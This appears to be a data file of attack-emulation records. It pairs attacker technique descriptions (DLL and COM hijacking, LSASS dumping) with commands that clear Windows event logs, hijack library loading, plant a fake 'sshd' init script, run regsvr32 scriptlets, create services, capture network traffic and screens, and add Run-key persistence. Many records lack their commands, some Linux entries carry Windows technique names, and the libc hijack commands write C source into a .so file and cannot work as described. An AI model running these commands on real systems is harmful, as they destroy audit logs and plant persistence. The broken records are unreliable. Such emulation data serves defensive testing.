extracted_ttps.description: Attackers download malicious files in several stages during their attacks. Second-stage malware is downloaded to a target host from a C2 server that stores malicious files for subsequent stages as well as auxiliary tools for supporting an attack.

The attacker uses the tasklist utility, Get-Process cmdlet in PowerShell, or WinAPI function CreateToolhelp32Snapshot to get information about running processes in Windows operating systems. In UNIX operating systems, the ps command is used, and the 'show process' command can be used on network devices.

extracted_ttps.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
extracted_ttps.description: Threat actors use DLL Search Order Hijacking to load a malicious DLL into a legitimate process by exploiting the Windows OS's standard procedure for searching for DLLs. Attackers drop a malicious library into a directory higher on the list than the directory containing the legitimate DLL, causing the malicious DLL to be loaded into the process.
Attackers dump the memory of the LSASS process to obtain sensitive information such as password hashes, session keys, and authentication tokens.

Attackers create scheduled tasks to elevate privileges and expand control over the system. This can be done using the Task Scheduler tool provided by Windows, and tasks can be created to run at system level, allowing for increased privileges.

The attacker injects a DLL into the address space of a target process, allowing the execution of malicious code within the context of the target process. The LoadLibrary function is used to load the attacker's DLL, and the DllMain function is executed after injection.

extracted_ttps.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
extracted_ttps.description: Attackers loaded a DLL that is absent from the system (Phantom DLL Hijacking) and loaded a standard DLL from a non-standard directory (Search Order Hijacking, DLL Side-Loading). They executed the code of wlbsctrl.dll in the address space of the svchost.exe process, made a DNS request to resolve the malicious domain boxilv.metuboss[.]com, and created a child process cmd.exe by svchost.exe to start the IKEEXT service.

extracted_ttps.technique_name: Event Triggered Execution: Component Object Model Hijacking
extracted_ttps.description: The attackers used COM Hijacking to register a malicious COM DLL and execute it using rundll32.exe. The COM object {ECD4FC4D-521C-11D0-B792-00A0C90312E1} was used, which corresponds to C:\\Windows\\system32\\explorerframe.dll. The malicious DLL was registered in the registry with the path $appdata\\brmsl.exe.mui.

The attacker replaces the executable file in the address space of a legitimate process, creating a malicious process with a legitimate name. Anomalies in parent and child processes can be detected in Windows.

extracted_ttps.description: Attackers use Image File Execution Options (IFEO) to persistently execute arbitrary code in the context of a legitimate process. They add a registry key to specify a debugger for a specific application, which is executed when the application is started.

attacks.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
attacks.command: mkdir -p /tmp/libtest && echo 'int printf(const char *format, ...) { return 0; }' > /tmp/libtest/libc.so.6 && LD_LIBRARY_PATH=/tmp/libtest:/lib64 /lib64/ld-linux-x86-64.so.2 /bin/true
attacks.description: Basic demonstration of LD_LIBRARY_PATH-based library preload to hijack libc function resolution with a dummy shared library.
attacks.expected_behavior: A dummy libc.so.6 is placed in /tmp/libtest, and LD_LIBRARY_PATH is set to prioritize it. The dynamic linker loads this version instead of the system one. The program runs normally but uses the hijacked printf. No actual harm occurs due to benign implementation.

attacks.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
attacks.description: Intermediate technique using LD_PRELOAD to load a malicious constructor-based shared library that executes on process startup.
attacks.expected_behavior: A shared library with a constructor function is compiled and preloaded via LD_PRELOAD. Any subsequent process launched in this environment will load the library. The constructor runs but performs no harmful action due to empty body.

attacks.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
attacks.command: mkdir -p /tmp/app && echo '#!/bin/bash\nexport LD_LIBRARY_PATH=/tmp/app:$LD_LIBRARY_PATH\nexec /lib64/ld-linux-x86-64.so.2 /bin/bash "$@"' > /tmp/run_app.sh && chmod +x /tmp/run_app.sh && echo 'int system(const char *command) { return 0; }' > /tmp/app/libc.so.6
attacks.description: Advanced simulation where a wrapper script sets LD_LIBRARY_PATH to load a hijacked libc from a local directory before launching a target binary.
attacks.expected_behavior: A wrapper script sets LD_LIBRARY_PATH to include /tmp/app first, then launches bash via the dynamic linker. The hijacked libc.so.6 is loaded, which overrides system() with a no-op. This simulates an attacker controlling library resolution in a targeted application launch context.

attacks.command:
sudo bash -c 'cat > /etc/init.d/sshd <<EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          sshd
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: OpenSSH daemon (dummy)
### END INIT INFO

case "$1" in
  start)
    /bin/sleep 60 &
    ;;
  stop)
    pkill -f "/bin/sleep 60"
    ;;
  *)
    echo "Usage: $0 {start|stop}"
    exit 1
    ;;
esac
exit 0
EOF
chmod +x /etc/init.d/sshd && update-rc.d sshd defaults && service sshd start'
attacks.description: Create a legacy SysV init script named 'sshd' (similar to the real OpenSSH daemon) that runs a harmless sleep command, register it to start at boot, and start the service.
attacks.expected_behavior: An init.d script is written, made executable, added to default runlevels, and the 'sshd' service is started, launching '/bin/sleep 60' in the background.

attacks.command: sc stop EventLog & wevtutil cl System & wevtutil cl Application & wevtutil cl Security & sc start EventLog
attacks.description: Advanced: Stop EventLog service before clearing logs
attacks.expected_behavior: Stops EventLog service to prevent logging during deletion, clears core logs, restarts service.

attacks.technique_name: Indicator Removal: Clear Windows Event Logs
attacks.description: Clears the syslog file by overwriting it with nothing, demonstrating basic log manipulation. Requires admin privileges.
attacks.expected_behavior: The syslog file will be cleared of its current contents.

attacks.technique_name: Indicator Removal: Clear Windows Event Logs
attacks.description: Finds all log files in /var/log and truncates them to zero size, demonstrating an advanced method of log clearing. Requires admin privileges.
attacks.expected_behavior: All log files in /var/log will be truncated, effectively clearing their contents without deleting the files themselves.

attacks.command: netsh trace start capture=yes tracefile="%TEMP%\network_capture_01.etl" maxsize=100
attacks.description: Starts a network packet capture using built-in netsh tool with a limited file size.
attacks.expected_behavior: Creates a network trace file in ETL format at %TEMP%\network_capture_01.etl if run with administrator privileges. Runs silently otherwise.

attacks.command: netsh trace start capture=yes tracefile="%TEMP%\capture_temp.etl" maxsize=50 report=disabled append=no & timeout /t 30 >nul & netsh trace stop
attacks.description: Starts a short-duration network capture with minimal overhead and stops after 30 seconds.
attacks.expected_behavior: Captures network traffic for 30 seconds, then stops and saves to %TEMP%\capture_temp.etl. Requires admin rights; otherwise, fails silently.

attacks.command: powershell -Command "Start-Process netsh -ArgumentList 'trace start capture=yes tracefile=\"%TEMP%\\encoded_capture.etl\" maxsize=75' -WindowStyle Hidden -Verb RunAs"
attacks.description: Executes a hidden network capture via PowerShell with elevation prompt, using Start-Process to launch netsh as administrator.
attacks.expected_behavior: Triggers a UAC prompt if not already elevated. On approval, starts a hidden network trace saved to %TEMP%\encoded_capture.etl. Fails silently if denied.

attacks.command: cmd.exe /c "echo ^<?XML version='1.0'?^> > %TEMP%\test.sct && echo ^<scriptlet^> >> %TEMP%\test.sct && echo ^<registration description='test'^/^> >> %TEMP%\test.sct && echo ^</scriptlet^> >> %TEMP%\test.sct && regsvr32 /s /n /u /i:%TEMP%\test.sct scrobj.dll"
attacks.description: Uses regsvr32 to execute a benign scriptlet file, simulating exploitation via scriptlet execution.
attacks.expected_behavior: regsvr32 silently loads the scriptlet file, mimicking malicious scriptlet execution behavior without payload.

attacks.command: cmd.exe /c "echo echo Exploit simulation ^> %TEMP%\service_out.txt > %TEMP%\payload.bat && sc create TestService binPath= "%TEMP%\payload.bat" start= auto && sc start TestService"
attacks.description: Creates/executes a service with benign batch payload, simulating post-exploitation service abuse.
attacks.expected_behavior: Service 'TestService' is created and started, executing the batch file to write %TEMP%\service_out.txt. Requires admin privileges.

attacks.description: Executes benign HTA via mshta to simulate client-side code execution abuse.
attacks.expected_behavior: mshta silently runs the HTA, which executes a WScript command to create %TEMP%\hta_out.txt.

attacks.description: Search for the '@' symbol, commonly found in email addresses, within files in the temporary directory.
attacks.expected_behavior: Lists files in the temporary directory containing the '@' symbol, potentially indicating the presence of email addresses.

attacks.description: Basic HTTPS file download using certutil
attacks.expected_behavior: Downloads test.txt over HTTPS to TEMP directory using Windows native certificate utility

attacks.description: Intermediate encrypted web request via PowerShell
attacks.expected_behavior: Creates HTTPS connection to example.com and saves response to TEMP directory using PowerShell's native web client

attacks.description: Advanced SSL tunnel via scheduled task (requires pre-created XML)
attacks.expected_behavior: Creates and runs scheduled task configured with SSL-encrypted communication parameters (assumes task.xml contains benign SSL test configuration)

attacks.description: Download a DLL payload using certutil, a built-in Windows utility often abused in attacks.
attacks.expected_behavior: Attempts to download a file from a local server to the TEMP directory. Fails silently if network is unreachable or file cannot be written.

attacks.description: Execute a DLL's exported function using rundll32, a technique commonly used in client-side exploitation.
attacks.expected_behavior: Attempts to load and execute a DLL from the TEMP directory. Will fail if the DLL does not exist or does not export the specified function.

attacks.description: Download and execute a PowerShell script from a remote server, simulating a common post-exploitation technique.
attacks.expected_behavior: Attempts to download and execute a remote PowerShell script. Execution will fail if the server is unreachable or script is malformed. No payload is active.

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [Windows.Forms.SystemInformation]::VirtualScreen; $screenshot = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $screenshot.Save("$env:TEMP\screenshot.png")"
attacks.description: Capture the screen using PowerShell and save as an image file
attacks.expected_behavior: The command captures the screen and saves it as a PNG image in the TEMP directory

attacks.description: Capture the screen using mspaint.exe and save as an image file
attacks.expected_behavior: The command captures the screen and saves it as a PNG image in the TEMP directory

attacks.command: powershell -Command "[Console]::WindowWidth=100; [Console]::WindowHeight=50; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [Windows.Forms.SystemInformation]::VirtualScreen; $screenshot = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $screenshot.Save("$env:TEMP\screenshot.png")"
attacks.description: Capture the screen using PowerShell with the EncodedCommand parameter and save as an image file
attacks.expected_behavior: The command captures the screen and saves it as a PNG image in the TEMP directory

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v test /t REG_SZ /d "cmd.exe /c echo test > %TEMP%\test.txt" /f
attacks.description: Adds a registry key to run a command upon user login, writing to a temp file.
attacks.expected_behavior: A registry key is added under HKCU, and upon next login, the command runs, creating a file in the temp directory.

attacks.description: Uses PowerShell to add a registry key for persistence, similar to the first command but utilizing PowerShell for the operation.
attacks.expected_behavior: Similar to the first command, but executed through PowerShell, adding a registry key and creating a file upon login.

attacks.command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v test3 /t REG_SZ /d "cmd.exe /c echo test3 > %TEMP%\test3.txt" /f
attacks.description: Adds a registry key under HKLM for system-wide persistence, requiring admin privileges.
attacks.expected_behavior: Requires admin rights, adds a key under HKLM, and upon system startup, executes the command, creating a file in the temp directory.
